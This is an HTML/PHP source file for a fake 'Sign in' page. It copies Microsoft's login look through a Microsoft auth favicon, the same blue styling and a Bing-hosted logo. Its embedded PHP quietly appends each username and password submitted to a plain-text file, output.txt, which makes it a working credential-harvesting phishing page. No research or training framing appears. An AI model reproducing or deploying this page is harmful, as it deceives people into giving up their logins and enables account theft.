<html>
<head>
<title>Sign in</title><link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <meta charset="UTF-8">
<style>

h1{
color: black;
text-align: center;
align-self: start;
}
img{
height: 3%;
}

html{
background-color: #106ebe;
}
        body {
            font-family: Arial, sans-serif;
            background-color: #106ebe;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 20px;
            margin: 8px 0;
            display: inline-block;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #106ebe;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            cursor: pointer;
            width: 100%;
        }
        input[type="submit"]:hover {
            opacity: 0.8;

        }
    </style>
</head>
<body>


<br/>
<?php
if(isset($_POST['username']) && isset($_POST['password'])) {
    $data='';
    $data = 'Username: ' . $_POST['username'] . "\n" . 'Password: ' . $_POST['password'] . "\n" . '-------------------------------------------------' . "\n";
    $filename = 'output.txt';

if (!file_exists($filename)) {
    $file = fopen($filename, 'w');
    $file = fopen($filename, 'a');
    fwrite($file, $data);
    fclose($file);
 }
else{
    $file = fopen($filename, 'a');
    fwrite($file, $data);
    fclose($file);
}


}
?>
<form method="post">
<img src="https://th.bing.com/th/id/OIP.ZMyMT66YhmZ7xZs5STxLLQHaBl?rs=1&pid=ImgDetMain" alt="Descrizione dell'immagine">

<br/>   <br/> Username/email: <input type="text" name="username"><br>
    Password: <input type="password" name="password"><br>
    <input type="submit" value="Submit">
</form>

</body>
</html>
